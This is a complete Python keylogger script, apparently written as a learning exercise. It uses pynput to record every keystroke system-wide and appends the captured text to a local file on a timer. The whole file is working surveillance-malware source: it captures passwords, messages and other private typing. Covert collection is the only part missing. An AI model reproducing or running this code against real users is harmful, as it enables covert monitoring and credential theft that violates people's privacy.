#!/usr/bin/env python
import pynput.keyboard
import time
import threading

"""
Creating program that allows us to save all info about
what key our user have entered and save this info in file 
"""


class KeyLogger:

    # time_interval - to specify time of saving list of keys
    # file_name - the name of file that will be created to store all info of keys
    def __init__(self, time_interval, file_name):
        self.log = ""
        self.interval = time_interval
        self.file_name = file_name
        self.start()

    # global variable that used to store keys
    def append_to_log(self, string):
        self.log += string

    # main method that will be executed when we create a listener
    def process_key_press(self, key):
        # cover in try-except to check if user enter letters or used special key such as backspace
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    """
    This method will be executed in the same time using threading in python
    to avoid problem that program stuck because both of them work all time and 
    need exact same variable, so they cannot be executed
    """
    def report(self):
        self.report_in_file(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # method that enter info into file, opening it as append mode
    def report_in_file(self, log):
        with open(self.file_name, "a") as out_file:
            out_file.write("\n\n" + log)

    # method to start our program
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
